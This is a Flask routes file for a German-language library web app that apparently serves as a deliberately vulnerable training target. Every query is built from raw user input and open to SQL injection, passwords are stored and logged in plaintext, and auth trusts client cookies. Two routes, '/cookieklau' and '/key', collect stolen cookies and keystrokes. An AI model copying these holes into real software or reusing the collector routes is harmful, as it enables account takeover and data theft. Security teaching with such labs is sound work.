from library import app, db
from flask import render_template, request, redirect, url_for
from sqlalchemy import text

@app.route('/')
def home():
    benutzername = get_benutzername(request)
    print(f"Recieved request for home page with benutzername {benutzername}")
    return render_template('home.html', benutzername=benutzername)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        benutzername = request.form['username']
        password = request.form['password']
        # Here you would typically check the benutzername and password against a database
        print(f"Recieved login request for {benutzername} with password {password}")

        query = f"SELECT * FROM benutzer WHERE benutzername='{benutzername}' AND passwort='{password}'"
        result = db.session.execute(text(query)).fetchall()
        print(f"Query result: {result}")
        if len(result) == 1:
            # Assuming the user is authenticated successfully
            resp = redirect(url_for('home'))
            resp.set_cookie('benutzername', result[0][1])  # Set a cookie with the benutzername
            resp.set_cookie('benutzerId', str(result[0][0]))  # Set a cookie with the benutzerId
            return resp
        if len(result) > 1:
            resp = redirect(url_for('home'))
            print(f"{str(result)}")
            resp.set_cookie('benutzername', str(result))
            return resp

        
        return render_template('login.html'), 400
    
    # If the request method is GET, just render the login page
    return render_template('login.html'), 200

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        benutzername = request.form['username']
        password = request.form['password']
        # Here you would typically save the new user to a database
        print(f"Recieved registration request for {benutzername} with password {password}")

        query = f"SELECT * FROM benutzer WHERE benutzername='{benutzername}'"
        result = db.session.execute(text(query)).fetchall()
        print(f"Query result: {result}")

        if len(result) == 0:
            # Assuming the user is registered successfully
            insert_query = f"INSERT INTO benutzer (benutzername, passwort) VALUES ('{benutzername}', '{password}')"
            db.session.execute(text(insert_query))
            db.session.commit()
            return redirect(url_for('login'))
        
        redirect(url_for('register'))
    
    # If the request method is GET, just render the register page
    return render_template('register.html')

@app.route('/logout')
def logout():
    resp = redirect(url_for('home'))
    resp.set_cookie('benutzerId', '', expires=0)  # Clear the cookie
    resp.set_cookie('benutzername', '', expires=0)  # Clear the cookie
    return resp

@app.route('/library')
def library():
    benutzername = get_benutzername(request)
    
    query = f"SELECT * FROM buch"
    result = db.session.execute(text(query)).fetchall()

    if len(result) == 0:
        print(f"No books found for user {benutzername}")
        return render_template('library.html', benutzername=benutzername, books=[])
    
    print(f"Recieved request for library page with benutzername {benutzername} and books {result}")
    return render_template('library.html', benutzername=benutzername, books=result)

@app.route('/more_info')
def more_info():
    benutzername = get_benutzername(request)
    buchid = request.args.get('bookId')
    
    query = f"SELECT * FROM buch WHERE buchid = {buchid}"
    result = db.session.execute(text(query)).fetchall()
    print(f"Query result: {result}")

    if len(result) == 0:
        print(f"No book found with id {buchid}")
        return render_template('more_info.html', benutzername=benutzername, book=None)
    
    print(f"Recieved request for more info page with benutzername {benutzername} and book {result[0]}")
    return render_template('more_info.html', benutzername=benutzername, book=result[0])

@app.route('/cookieklau')
def cookie_klau():
    stolen_cookies = request.args.get('cookies')
    print(f"Recieved request to steal cookies: {stolen_cookies}")
    return render_template('home.html')  # This is just a placeholder response

@app.route('/key/<keys>')
def key(keys):
    print(f"Recieved request for key with keys {keys}")
    with open('keys.txt', 'a') as f:
        f.write(keys + '\n')
    return render_template('home.html')

@app.route('/addBook', methods=['POST'])
def add_book():
    query = f"INSERT INTO buch (titel, author, jahr, beschreibung, genre, benutzerId) VALUES ('{request.form['title']}', '{request.form['author']}', '{request.form['year']}', '{request.form['description']}', '{request.form['genre']}', '{request.cookies.get('benutzerId')}')"
    result = db.session.execute(text(query))
    db.session.commit()
    print(f"Query result: {result}")
    print(f"Recieved request to add book with title {request.form['title']} and author {request.form['author']}")
    print(f"Book added successfully with id {result.lastrowid}")
    return redirect(url_for('library'))

@app.route('/deleteBook', methods=['GET'])
def delete_book():
    query = f"DELETE FROM buch WHERE buchid = {request.args.get('bookId')}"
    db.session.execute(text(query))
    db.session.commit()
    print(f"Recieved request to delete book with id {request.args}")
    return redirect(url_for('library'))

def get_benutzername(request):
    benutzername = request.cookies.get('benutzername')
    print(f"Recieved request for library page with benutzername {benutzername}")
    if benutzername is None:
        return 'Guest'
    return benutzername